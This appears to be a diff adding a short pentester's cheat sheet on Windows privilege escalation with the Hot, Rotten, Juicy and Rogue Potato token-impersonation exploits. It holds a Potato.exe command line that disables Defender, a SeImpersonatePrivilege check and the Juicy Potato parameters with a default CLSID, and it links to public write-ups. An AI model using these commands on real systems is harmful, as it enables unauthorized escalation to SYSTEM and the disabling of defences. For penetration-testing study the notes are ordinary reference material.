@@ -1,0 +1,33 @@
+<h1 id="hot-potato">HOT POTATO</h1>
+<hr />
+<p><a href="https://pentestlab.blog/2017/04/13/hot-potato/">WPE-06 - Hot Potato</a></p>
+
+<p>Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true</p>
+
+<h1 id="rotten-potato">ROTTEN POTATO</h1>
+<hr />
+<p><a href="https://pentestlab.blog/2017/04/03/token-manipulation/">WPE-10 - Token Manipulation</a>
+ is  possible to escalate privileges from a service that is not running as SYSTEM but as a network service as well.</p>
+
+<h1 id="juicy-potato">JUICY POTATO</h1>
+<hr />
+<p>source: https://github.com/ohpe/juicy-potato</p>
+<h2 id="detect">detect</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami /priv
+SeImpersonatePrivilege  Enabled &lt;- requirement or SeAssignPrimaryToken
+</code></pre></div></div>
+<h2 id="requirements">requirements</h2>
+<ul>
+  <li>you need:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-t createprocess call: &lt;t&gt; CreateProcessWithTokenW, &lt;u&gt; CreateProcessAsUser, &lt;*&gt; try both
+-p &lt;program&gt;: program to launch
+-l &lt;port&gt;: COM server listen port
+-c &lt;{clsid}&gt;: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097}) can peek anotherone from CLSIDs
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h1 id="rogue-potato">ROGUE POTATO</h1>
+<hr />
+<p>https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/
+https://github.com/antonioCoco/RoguePotato</p>
